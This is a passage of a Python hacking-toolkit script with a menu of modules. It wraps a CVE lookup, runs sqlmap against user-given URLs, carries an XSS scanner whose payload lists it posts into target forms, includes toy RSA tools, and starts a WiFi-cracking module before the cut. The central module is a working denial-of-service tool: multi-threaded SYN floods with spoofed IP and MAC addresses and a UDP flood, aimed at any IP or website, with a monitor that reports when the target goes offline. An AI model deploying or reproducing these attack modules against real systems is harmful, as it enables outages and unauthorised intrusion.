         ██████╗██╗   ██╗███████╗    ██████╗  █████╗ ████████╗ █████╗ ██████╗  █████╗ ███████╗███████╗
        ██╔════╝██║   ██║██╔════╝    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝
        ██║     ██║   ██║█████╗      ██║  ██║███████║   ██║   ███████║██████╔╝███████║███████╗█████╗
        ██║     ╚██╗ ██╔╝██╔══╝      ██║  ██║██╔══██║   ██║   ██╔══██║██╔══██╗██╔══██║╚════██║██╔══╝
        ╚██████╗ ╚████╔╝ ███████╗    ██████╔╝██║  ██║   ██║   ██║  ██║██████╔╝██║  ██║███████║███████╗
         ╚═════╝  ╚═══╝  ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
                    CVE Exploit Database  •  NVD-backed vulnerability reference lookup
        """

        def run_cve(extra_args):
            """Run cve_lookup.py from its own directory so its bare imports resolve."""
            cmd = [sys.executable, CVE_SCRIPT] + extra_args
            try:
                subprocess.run(cmd, cwd=CVE_DIR)
            except FileNotFoundError:
                print(f"{Fore.RED}[!] cve_lookup.py not found at {CVE_SCRIPT}{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Lookup interrupted.{Style.RESET_ALL}")

        if not os.path.isfile(CVE_SCRIPT):
            print(f"{Fore.RED}[!] CVE database module missing (expected {CVE_SCRIPT}).{Style.RESET_ALL}")
        else:
            print(GREEN + CVE_ASCII + RESET)
            print("=" * 70)
            print(f"{Fore.WHITE}  [1] Search CVEs by service and version")
            print("  [2] Filter by vulnerability category (rce, sqli, xss, ...)")
            print("  [3] Update local CVE cache from NVD (requires internet)")
            print("  [4] List known / curated services")
            print("  [5] List vulnerability categories")
            print("  [6] Interactive lookup")
            print(f"  [0] Back to main menu{Style.RESET_ALL}\n")

            while True:
                try:
                    cve_choice = input(f"""{Fore.RED}
    ┌───({Fore.WHITE}User@cve-db{Fore.RED})─[{Fore.WHITE}~/4{Fore.RED}]
    └──$  {Fore.WHITE}""").strip()
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}[!] Leaving CVE database.{Style.RESET_ALL}")
                    break

                if cve_choice in ("0", ""):
                    print("Exiting CVE database module...")
                    break

                elif cve_choice == "1":
                    service = input(f"{Fore.YELLOW}Service/product (e.g. nginx, openssh): {Style.RESET_ALL}").strip()
                    if not service:
                        print(f"{Fore.RED}[!] No service specified.{Style.RESET_ALL}")
                        continue
                    version = input(f"{Fore.YELLOW}Version (blank for any): {Style.RESET_ALL}").strip()
                    verbose = input(f"{Fore.YELLOW}Full descriptions? (y/N): {Style.RESET_ALL}").strip().lower()
                    args_ = ["--service", service, "--no-pager"]
                    if version:
                        args_ += ["--version", version]
                    if verbose in ("y", "yes"):
                        args_.append("-v")
                    run_cve(args_)

                elif cve_choice == "2":
                    print(f"{Fore.CYAN}Categories: rce, sqli, command_injection, xss, csrf, path_traversal,")
                    print("buffer_overflow, priv_esc, auth_bypass, dos, info_disclosure, ssrf,")
                    print(f"deserialization, xxe, hardcoded_creds{Style.RESET_ALL}")
                    category = input(f"{Fore.YELLOW}Category key: {Style.RESET_ALL}").strip()
                    if not category:
                        print(f"{Fore.RED}[!] No category specified.{Style.RESET_ALL}")
                        continue
                    service = input(f"{Fore.YELLOW}Service/product (blank = across all products): {Style.RESET_ALL}").strip()
                    version = input(f"{Fore.YELLOW}Version (blank for any): {Style.RESET_ALL}").strip()
                    args_ = ["--category", category, "--no-pager"]
                    if service:
                        args_ += ["--service", service]
                    if version:
                        args_ += ["--version", version]
                    run_cve(args_)

                elif cve_choice == "3":
                    print(f"{Fore.YELLOW}Update the local cache from NVD. Blank service = full curated list (slow).{Style.RESET_ALL}")
                    service = input(f"{Fore.YELLOW}Service to update (blank for all curated): {Style.RESET_ALL}").strip()
                    api_key = input(f"{Fore.YELLOW}NVD API key (blank = none, slower): {Style.RESET_ALL}").strip()
                    args_ = ["--update"]
                    if service:
                        args_ += ["--service", service]
                    if api_key:
                        args_ += ["--api-key", api_key]
                    run_cve(args_)

                elif cve_choice == "4":
                    run_cve(["--list-services", "--no-pager"])

                elif cve_choice == "5":
                    run_cve(["--list-categories", "--no-pager"])

                elif cve_choice == "6":
                    run_cve([])

                else:
                    print(f"{Fore.RED}[!] Unknown option. Try 0-6.{Style.RESET_ALL}")
    case "5":

        init(autoreset=True)


        packets_sent = 0        
        bytes_sent = 0      
        stats_lock = threading.Lock() 


        dosascii = r"""
        _(`-')               (`-').->     (`-')  _ (`-')     (`-')     (`-')  _           <-.(`-')  
        ( (OO ).->     .->    ( OO)_       (OO ).-/ ( OO).->  ( OO).->  (OO ).-/  _         __( OO)  
        \    .'_ (`-')----. (_)--\_)      / ,---.  /    '._  /    '._  / ,---.   \-,-----.'-'. ,--. 
        '`'-..__)( OO).-.  '/    _ /      | \ /`.\ |'--...__)|'--...__)| \ /`.\   |  .--./|  .'   / 
        |  |  ' |( _) | |  |\_..`--.      '-'|_.' |`--.  .--'`--.  .--''-'|_.' | /_) (`-')|      /) 
        |  |  / : \|  |)|  |.-._)   \    (|  .-.  |   |  |      |  |  (|  .-.  | ||  |OO )|  .   '  
        |  '-'  /  '  '-'  '\       /     |  | |  |   |  |      |  |   |  | |  |(_'  '--'\|  |\   \ 
        `------'    `-----'  `-----'      `--' `--'   `--'      `--'   `--' `--'   `-----'`--' '--' """

        menu = r"""
        ╔════════════════ANGRIFFS-KONFIGURATION  ═══════════════╗
          1. SYN Flood [Layer 4] (Only IP spoofing)
          2. SYN Flood [Layer 2] (IP + MAC spoofing - Ethernet)
          3. UDP Flood [Layer 4] (Bandwidth - Maximum Load)
        ╚═══════════════════════════════════════════════════════╝"""

        print(Fore.RED + dosascii)
        print(Fore.WHITE + menu)

        # --- HILFSFUNKTIONEN ---
        def get_random_mac():
            return "02:%02x:%02x:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

        def get_random_ip():
            return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

        def get_random_port():
            return random.randint(1, 65535)

        def check_router_online(ip):
            
            try:
                
                cmd = ['ping', '-n', '1', '-w', '2000', ip] if os.name == 'nt' else ['ping', '-c', '1', '-W', '2', ip]
                return subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0
            except:
                return False


        def stats_monitor(target_ip):
            global packets_sent, bytes_sent
            print(f"{Fore.CYAN}[i] Monitor started...")
            while True:
            
                with stats_lock:
                    p_per_sec = packets_sent
                    b_per_sec = bytes_sent
                    packets_sent = 0
                    bytes_sent = 0
                
                
                mbps = (b_per_sec * 8) / (1024 * 1024)
                # Ping Check
                online = check_router_online(target_ip)
                status = f"{Fore.GREEN}ONLINE" if online else f"{Fore.RED}DEATH/LAG"
                
                # Live-Anzeige
                sys.stdout.write(f"\r{Fore.WHITE}[STATS] {mbps:.2f} Mbps | {p_per_sec} Pkt/s | Router: {status}      ")
                sys.stdout.flush()
                time.sleep(1)

        # --- ANGRIFFS-LOGIK ---
        def syn_flood_l4(target_ip):
            global packets_sent, bytes_sent
            while True:
                try:
                    ip_layer = IP(src=get_random_ip(), dst=target_ip)
                    tcp_layer = TCP(sport=get_random_port(), dport=get_random_port(), flags="S")
                    pkt = ip_layer/tcp_layer
                    send(pkt, verbose=False)
                    
                    with stats_lock:
                        packets_sent += 1
                        bytes_sent += len(pkt) # Scapy Paketgröße zählen
                except: pass

        def syn_flood_l2(target_ip):
            global packets_sent, bytes_sent
            while True:
                try:
                    pkt = Ether(src=get_random_mac())/IP(src=get_random_ip(), dst=target_ip)/TCP(sport=get_random_port(), dport=get_random_port(), flags="S")
                    sendp(pkt, verbose=False)
                    with stats_lock:
                        packets_sent += 1
                        bytes_sent += len(pkt)
                except: pass

        def udp_flood(target_ip):
            global packets_sent, bytes_sent
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024) # 1 KB Paket
            p_size = len(payload)
            while True:
                try:
                    client.sendto(payload, (target_ip, get_random_port()))
                    with stats_lock:
                        packets_sent += 1
                        bytes_sent += p_size
                except: pass

        choice = input(f"{Fore.RED}Choose mode (1/2/3): {Fore.WHITE}")
        if choice in ["1", "2", "3"]:
            ipwebsite = input(f"{Fore.RED}Target IP or Website: 'IP' / 'www': {Fore.WHITE}")
            if ipwebsite.startswith("www."):
                target_ip = socket.gethostbyname(ipwebsite)
            else:
                target_ip = ipwebsite
            threads_count = int(input(f"{Fore.RED}Number of Threads: {Fore.WHITE}"))

            # Monitor-Thread starten
            threading.Thread(target=stats_monitor, args=(target_ip,), daemon=True).start()

            # Angriffs-Threads starten
            for _ in range(threads_count):
                if choice == "1": target = syn_flood_l4
                elif choice == "2": target = syn_flood_l2
                else: target = udp_flood
                threading.Thread(target=target, args=(target_ip,), daemon=True).start()

            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.GREEN}[!] Attack terminated.")
    case "6":
        print("\n=== SQLMAP MODULE ===\n")

        url = input("URL: ")
        cookie = input("Cookie (e.g. PHPSESSID=...; security=low): ")
        extra = input("Extra Options (Enter = Default): ")

        import os
        import sys
        import subprocess

        import shutil

        sqlmap_path = shutil.which("sqlmap")

        if not sqlmap_path:
            print("[!] sqlmap is not installed or not available in PATH.")
            print("[!] Install sqlmap using your Linux package manager.")
        else:
            cmd = [
                sqlmap_path,
                "-u", url,
                "--cookie", cookie,
                "--batch",
                "--dbs",
                "--forms"
            ]

            if extra:
                cmd.extend(extra.split())

            print("\n[+] Starting sqlmap...\n")

            subprocess.run(cmd)
    case "8":
        ascii_xss = r"""                                                                                                  
    ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄   ▄▄▄▄   ▄▄▄    ▄▄▄ ▄▄▄    ▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄   
    ████▄████ █████▀▀▀ █████▀▀▀   █████▀▀▀ ███▀▀▀▀▀ ▄██▀▀██▄ ████▄  ███ ████▄  ███ ███▀▀▀▀▀ ███▀▀███▄ 
    ▀█████▀   ▀████▄   ▀████▄     ▀████▄  ███      ███  ███ ███▀██▄███ ███▀██▄███ ███▄▄    ███▄▄███▀ 
    ▄███████▄    ▀████    ▀████      ▀████ ███      ███▀▀███ ███  ▀████ ███  ▀████ ███      ███▀▀██▄  
    ███▀ ▀███ ███████▀ ███████▀   ███████▀ ▀███████ ███  ███ ███    ███ ███    ███ ▀███████ ███  ▀███ 
                                                                                                    
                                                                                                    """
        
        print(ascii_xss)
        
        # ─── XSS SCANNER ─────────────────────────────────────────────
        import urllib.request
        import urllib.parse
        import urllib.error
        import re
        from html.parser import HTMLParser
        
        # Farben für Ausgabe
        GREEN  = "\033[92m"
        YELLOW = "\033[93m"
        RED    = "\033[91m"
        CYAN   = "\033[96m"
        WHITE  = "\033[97m"
        BOLD   = "\033[1m"
        RESET  = "\033[0m"
        
        class XSSScanner:
            """Ein einfacher, aber effektiver XSS-Scanner"""
            
            def __init__(self):
                self.vulnerabilities = []
                self.timeout = 5
            
            # ─── REFLECTED XSS Test-Payloads ───
            REFLECTED_PAYLOADS = [
                # Basis-Test
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                
                # HTML-Kontext
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                
                # Event-Handler
                "\" onmouseover=\"alert(1)\"",
                "' onfocus='alert(1)'",
                
                # Attribut-Kontext
                "\" autofocus onfocus=\"alert(1)\"",
                "javascript:alert(1)",
                
                # Unicode / Encoding-Bypass
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
                
                # Polyglot
                "\"'><img src=x onerror=alert(1)>",
                
                # Angular / Template
                "{{constructor.constructor('alert(1)')()}}",
                
                # DOM-basiert
                "#<script>alert(1)</script>",
            ]
            
            # ─── STORED XSS Test-Payloads ───
            STORED_PAYLOADS = [
                "<script>alert('STORED_XSS')</script>",
                "<img src=x onerror=alert('STORED_XSS')>",
                "<svg onload=alert('STORED_XSS')>",
            ]
            
            # ─── Suchmuster für Reflected XSS ───
            REFLECTED_PATTERNS = [
                re.compile(r'<script>alert\(1\)</script>', re.I),
                re.compile(r'<script>alert\(\'XSS\'\)</script>', re.I),
                re.compile(r'<img src=x onerror=alert\(1\)>', re.I),
                re.compile(r'<svg onload=alert\(1\)>', re.I),
                re.compile(r'<body onload=alert\(1\)>', re.I),
                re.compile(r'alert\(1\)', re.I),
                re.compile(r'&#97;&#108;&#101;&#114;&#116;', re.I),
            ]
            
            def fetch_url(self, url, payload=None):
                """URL aufrufen und Response abholen"""
                try:
                    full_url = url.replace("FUZZ", urllib.parse.quote(payload)) if payload and "FUZZ" in url else url
                    
                    if payload and "FUZZ" not in url:
                        parsed = urllib.parse.urlparse(url)
                        params = urllib.parse.parse_qs(parsed.query)
                        
                        # Payload an ersten Parameter anhängen
                        for key in params:
                            params[key] = [payload]
                        
                        new_query = urllib.parse.urlencode(params, doseq=True)
                        full_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query, parsed.fragment
                        ))
                    
                    req = urllib.request.Request(
                        full_url,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                        }
                    )
                    
                    with urllib.request.urlopen(req, timeout=self.timeout) as response:
                        html = response.read().decode('utf-8', errors='ignore')
                        return html, str(response.status)
                        
                except urllib.error.HTTPError as e:
                    return e.read().decode('utf-8', errors='ignore'), str(e.code)
                except urllib.error.URLError as e:
                    return "", f"Fehler: {e.reason}"
                except Exception as e:
                    return "", f"Fehler: {str(e)}"
            
            def extract_forms(self, url):
                """Alle Formulare aus einer Seite extrahieren"""
                html, _ = self.fetch_url(url)
                forms = []
                
                # Einfacher Form-Parser
                form_pattern = re.compile(
                    r'<form[^>]*action=["\']?([^"\'>\s]+)["\']?[^>]*>(.*?)</form>',
                    re.I | re.DOTALL
                )
                
                for form_match in form_pattern.finditer(html):
                    form_action = form_match.group(1)
                    form_content = form_match.group(2)
                    
                    # Absolute URL bauen
                    if not form_action.startswith("http"):
                        base = url.rstrip("/") + "/"
                        if form_action.startswith("/"):
                            parsed = urllib.parse.urlparse(url)
                            base = f"{parsed.scheme}://{parsed.netloc}"
                        form_action = base + form_action.lstrip("/")
                    
                    # Input-Felder extrahieren
                    inputs = []
                    input_pattern = re.compile(
                        r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
                        re.I
                    )
                    
                    for inp in input_pattern.finditer(form_content):
                        name = inp.group(1)
                        # Check ob es ein Textfeld ist (kein submit, button, hidden, etc.)
                        if not re.search(r'type=["\'](submit|button|hidden|checkbox|radio)["\']', inp.group(0), re.I):
                            inputs.append(name)
                    
                    if inputs:
                        forms.append({
                            "action": form_action,
                            "method": "POST" if re.search(r'method=["\']post["\']', form_match.group(0), re.I) else "GET",
                            "inputs": inputs
                        })
                
                return forms
            
            def test_reflected_xss(self, url, payload):
                """Teste einen einzelnen Payload auf Reflected XSS"""
                print(f"{WHITE}    Teste: {CYAN}{payload[:50]}{'...' if len(payload) > 50 else ''}{RESET}")
                
                html, status = self.fetch_url(url, payload)
                
                if "Fehler" in status:
                    print(f"{RED}    [!] {status}{RESET}")
                    return False
                
                for pattern in self.REFLECTED_PATTERNS:
                    if pattern.search(html):
                        return True
                
                # Generischer Check: Enthält die Seite den Payload?
                if payload.strip("'\"")[:10] in html:
                    return True
                
                return False
            
            def test_stored_xss(self, form, payload):
                """Teste einen Payload auf Stored XSS via Formular"""
                print(f"{WHITE}    Sende POST an {CYAN}{form['action'][:60]}{RESET}")
                
                try:
                    # POST-Daten bauen
                    post_data = {}
                    for inp in form["inputs"]:
                        post_data[inp] = payload
                    
                    data = urllib.parse.urlencode(post_data).encode()
                    
                    req = urllib.request.Request(
                        form["action"],
                        data=data,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            "Content-Type": "application/x-www-form-urlencoded",
                        }
                    )
                    
                    with urllib.request.urlopen(req, timeout=self.timeout) as response:
                        response.read() 
                    

                    html, _ = self.fetch_url(form["action"])
                    
                    if payload.strip("'\"")[:15] in html:
                        return True
                        
                except Exception as e:
                    pass
                
                return False
            
            def scan_url(self, url):
                """Kompletten Scan einer URL durchführen"""
                print(f"\n{BOLD}{CYAN}═══ XSS-Scan: {url} ═══{RESET}\n")
                
                # ─── Phase 1: Reflected XSS ───
                print(f"{BOLD}{YELLOW}[Phase 1/3] Testing Reflected XSS...{RESET}\n")
                
                # Prüfen ob URL Parameter hat
                if "?" in url or "FUZZ" in url:
                    for payload in self.REFLECTED_PAYLOADS:
                        print(f"{WHITE}  → Payload {self.REFLECTED_PAYLOADS.index(payload)+1}/{len(self.REFLECTED_PAYLOADS)}{RESET}")
                        if self.test_reflected_xss(url, payload):
                            print(f"\n{GREEN}{BOLD}[+] REFLECTED XSS FOUND!{RESET}")
                            print(f"{GREEN}    Payload: {payload}{RESET}\n")
                            self.vulnerabilities.append({
                                "type": "Reflected XSS",
                                "url": url,
                                "payload": payload,
                                "severity": "Hoch"
                            })
                            break  # Ein Treffer reicht
                else:
                    print(f"{YELLOW}  [!] No URL parameters found. Skipping reflected test.{RESET}")
                
                # ─── Phase 2: Formular-basiertes Stored XSS ───
                print(f"\n{BOLD}{YELLOW}[Phase 2/3] Testing Forms-based Stored XSS...{RESET}\n")
                forms = self.extract_forms(url)
                
                if forms:
                    print(f"{GREEN}  [+] {len(forms)} Form found{RESET}\n")
                    
                    print(f"{BOLD}{YELLOW}[Phase 3/3] Testing Stored XSS (Forms)...{RESET}\n")
                    
                    for i, form in enumerate(forms):
                        print(f"{WHITE}  ── Form {i+1}: {form['action'][:60]}{RESET}")
                        print(f"{WHITE}     Fields: {', '.join(form['inputs'])}{RESET}")
                        
                        for payload in self.STORED_PAYLOADS:
                            print(f"{WHITE}    Testing Stored Payload {self.STORED_PAYLOADS.index(payload)+1}/{len(self.STORED_PAYLOADS)}{RESET}")
                            if self.test_stored_xss(form, payload):
                                print(f"\n{GREEN}{BOLD}[+] STORED XSS FOUND!{RESET}")
                                print(f"{GREEN}    Payload: {payload}{RESET}")
                                print(f"{GREEN}    Form: {form['action']}{RESET}\n")
                                self.vulnerabilities.append({
                                    "type": "Stored XSS",
                                    "url": form["action"],
                                    "payload": payload,
                                    "severity": "Critical"
                                })
                                break
                else:
                    print(f"{YELLOW}  [!] No forms found on the page.{RESET}")
                
                # ─── Zusammenfassung ───
                return self.summary()
            
            def scan_urls_from_file(self, filepath):
                """Mehrere URLs aus einer Datei scannen"""
                try:
                    with open(filepath, 'r') as f:
                        urls = [line.strip() for line in f if line.strip()]
                except FileNotFoundError:
                    print(f"{RED}[!] File not found: {filepath}{RESET}")
                    return
                
                print(f"{CYAN}[+] {len(urls)} URLs loaded from file{RESET}\n")
                
                for url in urls:
                    self.scan_url(url)
                    print(f"\n{CYAN}{'═'*50}{RESET}\n")
            
            def summary(self):
                """Ergebnis-Zusammenfassung anzeigen"""
                print(f"\n{BOLD}{CYAN}══════════ XSS-SCAN completed ══════════{RESET}\n")
                
                if not self.vulnerabilities:
                    print(f"{GREEN}{BOLD}[✓] No XSS vulnerabilities found.{RESET}")
                    print(f"{YELLOW}    Note: No findings does not necessarily mean security.{RESET}")
                    print(f"{YELLOW}    Manual verification is recommended.{RESET}")
                else:
                    print(f"{RED}{BOLD}[!] {len(self.vulnerabilities)} XSS vulnerability(ies) found:{RESET}\n")
                    
                    for i, vuln in enumerate(self.vulnerabilities, 1):
                        severity_color = RED if vuln["severity"] == "Critical" else YELLOW
                        print(f"{severity_color}{BOLD}  {i}. {vuln['type']} ({vuln['severity']}){RESET}")
                        print(f"{WHITE}     URL:     {vuln['url']}{RESET}")
                        print(f"{WHITE}     Payload: {vuln['payload']}{RESET}")
                        print()
                
                return self.vulnerabilities
        
        # ─── BENUTZER-INTERFACE ─────────────────────────────────────
        print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════{RESET}")
        print(f"{BOLD}{CYAN}      XSS STRIKE - Advanced XSS Scanner     {RESET}")
        print(f"{BOLD}{CYAN}═══════════════════════════════════════════{RESET}\n")
        
        print(f"{WHITE}  [1] Single URL scannen{RESET}")
        print(f"{WHITE}  [2] URLs from file scannen{RESET}")
        print(f"{WHITE}  [3] Custom Payloads{RESET}")
        print(f"{WHITE}  [0] Back to main menu{RESET}\n")
        
        mode = input(f"{RED}┌───({WHITE}XSS Mode{RED})─[{WHITE}~/1{WHITE}]{RED}\n└──$ {RESET}")
        
        scanner = XSSScanner()
        
        if mode == "1":
            url = input(f"{CYAN}Target URL (with ?param=FUZZ or ?param=value): {RESET}")
            scanner.scan_url(url)
            
        elif mode == "2":
            filepath = input(f"{CYAN}Path to URL list (one URL per line): {RESET}")
            scanner.scan_urls_from_file(filepath)
            
        elif mode == "3":
            print(f"\n{YELLOW}[!] Custom Payloads{RESET}")
            url = input(f"{CYAN}Target URL: {RESET}")
            payloads_raw = input(f"{CYAN}Payloads (comma-separated): {RESET}")
            
            custom_payloads = [p.strip() for p in payloads_raw.split(",") if p.strip()]
            
            scanner.REFLECTED_PAYLOADS = custom_payloads
            
            for payload in custom_payloads:
                print(f"\n{WHITE}  Testing Payload: {CYAN}{payload}{RESET}")
                found = scanner.test_reflected_xss(url, payload)
                if found:
                    print(f"\n{GREEN}{BOLD}[+] XSS FOUND! Payload: {payload}{RESET}")
                    scanner.vulnerabilities.append({
                        "type": "Reflected XSS",
                        "url": url,
                        "payload": payload,
                        "severity": "Hoch"
                    })
            
            scanner.summary()
        
        elif mode == "0":
            print(f"{YELLOW}Back to main menu...{RESET}")
        
        else:
            print(f"{RED}[!] Invalid input.{RESET}")
        
        # Warten, damit der User die Ergebnisse lesen kann
        if mode in ["1", "2", "3"]:
            input(f"\n{WHITE}Press Enter to continue...{RESET}")
 
    case "12":

        init(autoreset=True)

        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        CYAN = Fore.CYAN

        logo = r"""
        ▄████████    ▄█    █▄       ▄████████ ████████▄   ▄██████▄   ▄█     █▄   ▄█        ▄██████▄   ▄████████    ▄█   ▄█▄ 
        ███    ███   ███    ███     ███    ███ ███   ▀███ ███    ███ ███     ███ ███       ███    ███ ███    ███   ███ ▄███▀ 
        ███    █▀    ███    ███     ███    ███ ███    ███ ███    ███ ███     ███ ███       ███    ███ ███    █▀    ███▐██▀   
        ███         ▄███▄▄▄▄███▄▄   ███    ███ ███    ███ ███    ███ ███     ███ ███       ███    ███ ███         ▄█████▀    
        ▀███████████ ▀▀███▀▀▀▀███▀  ▀███████████ ███    ███ ███    ███ ███     ███ ███       ███    ███ ███        ▀▀█████▄    
                ███   ███    ███     ███    ███ ███    ███ ███    ███ ███     ███ ███       ███    ███ ███    █▄    ███▐██▄   
        ▄█    ███   ███    ███     ███    ███ ███   ▄███ ███    ███ ███ ▄█▄ ███ ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ 
        ▄████████▀    ███    █▀      ███    █▀  ████████▀   ▀██████▀   ▀███▀███▀  █████▄▄██  ▀██████▀  ████████▀    ███   ▀█▀ 
                                                                                ▀         
        """

        print(RED + logo + Style.RESET_ALL)

        def generate_keys(bits):
            p = getPrime(bits)
            q = getPrime(bits)

            while p == q:
                q = getPrime(bits)

            n = p * q
            phi = (p - 1) * (q - 1)

            e = 65537
            while gcd(e, phi) != 1:
                e += 2

            d = inverse(e, phi)

            return p, q, n, e, d


        def generate_keys_from_primes(p, q):
            n = p * q
            phi = (p - 1) * (q - 1)

            e = 65537
            while gcd(e, phi) != 1:
                e += 2

            d = inverse(e, phi)

            return n, e, d


        def encrypt_text(text, e, n):
            ascii_values = [ord(char) for char in text]
            encrypted = [pow(v, e, n) for v in ascii_values]
            return ascii_values, encrypted


        def decrypt_text(encrypted, d, n):
            decrypted_ascii = [pow(v, d, n) for v in encrypted]
            return "".join(chr(v) for v in decrypted_ascii)


        def encrypt_integer(number, e, n):
            if number >= n:
                raise ValueError(f"Number must be smaller than n ({n})")
            return pow(number, e, n)


        def decrypt_integer(cipher, d, n):
            return pow(cipher, d, n)


        print("============== RSA Calculator ==============")

        print("\nKey Mode:")
        print("1. Auto-generate key")
        print("2. Enter your own primes (p, q)")

        mode = input("Choose option [1/2]: ")

        # ---------------- KEY GENERATION ----------------
        if mode == "1":
            bits = int(input("Enter key size in bits (e.g., 256, 512, 1024): "))

            print("\nGenerating RSA keys...")

            for _ in tqdm(range(100), desc="Key generation", ncols=80, colour="cyan"):
                time.sleep(0.01)

            p, q, n, e, d = generate_keys(bits)

        elif mode == "2":
            p = int(input("Enter prime p: "))
            q = int(input("Enter prime q: "))

            print("\nProcessing custom keys...")

            for _ in tqdm(range(100), desc="Key build", ncols=80, colour="yellow"):
                time.sleep(0.005)

            n, e, d = generate_keys_from_primes(p, q)

        else:
            print("Invalid option")
            exit()

        # ---------------- INPUT ----------------
        user_input = input("\nEnter message or integer: ")

        print("\nSelected keys:")
        print(f"p = {p}")
        print(f"q = {q}")
        print(f"n = {n}")
        print(f"e = {e}")
        print(f"d = {d}")

        import time

        # ---------------- INTEGER ----------------
        if user_input.isdigit():

            number = int(user_input)

            print("\nEncrypting integer...")

            for _ in tqdm(range(100), desc="Encryption", ncols=80, colour="green"):
                time.sleep(0.005)

            encrypted = encrypt_integer(number, e, n)

            print("\nEncrypted message:")
            print(str(encrypted))

            print("\nDecrypting integer...")

            for _ in tqdm(range(100), desc="Decryption", ncols=80, colour="red"):
                time.sleep(0.005)

            decrypted = decrypt_integer(encrypted, d, n)

            print(f"Decrypted: {decrypted}")

            save = input("\nDo you want to save the result to a file? (y/n): ")

            if save.lower() == "y":
                with open("encrypted_message.txt", "w") as file:
                    file.write("=========== RSA Encryption ===========\n\n")
                    file.write(f"p: {p}\nq: {q}\n")
                    file.write(f"n,e: ({n},{e})\n")
                    file.write(f"n,d: ({n},{d})\n\n")
                    file.write(f"Encrypted: {encrypted}\n")
                    file.write(f"Decrypted: {decrypted}")

        # ---------------- TEXT ----------------
        else:

            print("\nEncrypting text...")

            for _ in tqdm(range(100), desc="Encryption", ncols=80, colour="green"):
                time.sleep(0.005)

            ascii_values, encrypted = encrypt_text(user_input, e, n)

            print("\nDecrypting text...")

            for _ in tqdm(range(100), desc="Decryption", ncols=80, colour="red"):
                time.sleep(0.005)

            decrypted = decrypt_text(encrypted, d, n)

            print("\nASCII values:")
            print(" ".join(map(str, ascii_values)))

            encrypted_str = " ".join(map(str, encrypted))

            print("\nEncrypted message (preview):")
            print(encrypted_str[:200] + (" ..." if len(encrypted_str) > 200 else ""))

            auto_save = len(encrypted_str) > 5000

            if auto_save:
                print("\n Ciphertext is very large!")

            save = input("\nDo you want to save ciphertext to a file? (y/n): ")

            import os
            timestamp = str(int(time.time()))

            if save.lower() == "y" or auto_save:

                filename = f"encrypted_message_{timestamp}.txt"
                cipher_file = f"ciphertext_{timestamp}.txt"

                with open(filename, "w", encoding="utf-8") as file:
                    file.write("=========== RSA ENCRYPTION ===========\n\n")
                    file.write(f"p: {p}\nq: {q}\n")
                    file.write(f"n,e: ({n},{e})\n")
                    file.write(f"n,d: ({n},{d})\n\n")
                    file.write(f"Original message:\n{user_input}\n\n")
                    file.write("ASCII values:\n")
                    file.write(" ".join(map(str, ascii_values)))
                    file.write("\n\nEncrypted message:\n")
                    file.write(encrypted_str)
                    file.write(f"\n\nDecrypted message:\n{decrypted}")

                with open(cipher_file, "w", encoding="utf-8") as file:
                    file.write(encrypted_str)

                print(f"\nReport saved: {filename}")
                print(f"Ciphertext saved: {cipher_file}")
                print(f"\nSaved in {os.getcwd()}")

        print("\nDone.")
    case "13":
        def decrypt(ciphertext, n, d):
            encrypted = list(map(int, ciphertext.split()))
            decrypted_ascii = [pow(c, d, n) for c in encrypted]
            return "".join(chr(x % 256) for x in decrypted_ascii)


        print("========== RSA DECRYPTOR ==========")

        file_path = input("\nEnter path to ciphertext file: ").strip()

        n = int(input("Enter modulus n: ").strip())
        d = int(input("Enter private key d: ").strip())

        try:
            with open(file_path, "r", encoding="utf-8") as file:
                content = file.read()

            # Extract ciphertext
            if "Encrypted message:" in content:
                ciphertext = content.split("Encrypted message:")[1].strip()
            else:
                ciphertext = content.strip()

            print("\nDecrypting...\n")

            decrypted = decrypt(ciphertext, n, d)

            print("=========== RESULT ===========\n")
            print(decrypted)

            save = input("\nSave decrypted message? (y/n): ").lower()

            if save == "y":
                out_file = "decrypted_output.txt"
                with open(out_file, "w", encoding="utf-8") as f:
                    f.write(decrypted)

                print(f"\nSaved to {out_file}")

        except FileNotFoundError:
            print("ERROR: File not found.")
        except ValueError:
            print("ERROR: Invalid n/d or corrupted ciphertext.")
        except Exception as e:
            print("ERROR:", e)  
    case "7":
                # Automation for cracking WIFI password
        # Tools used: aircrack-ng, airmon-ng, airodump-ng, mdk4, aireplay
        # This shit is hardcoded so it killed my expensive time only for you...

        GREEN = Fore.GREEN
        RED = Fore.RED
        RESET = "\033[0m"
        AIRBREAK_ASCII = r"""                                                                                                                       
                                                    ..                                                      
                                                ...                                                       
                                                ...                                                        
                                                ...                                                        
                            ...              ...                                                         
                                                ...                                                         
                                            ...                                                          
                                            ..                                                            
        ....                           .                                                                 
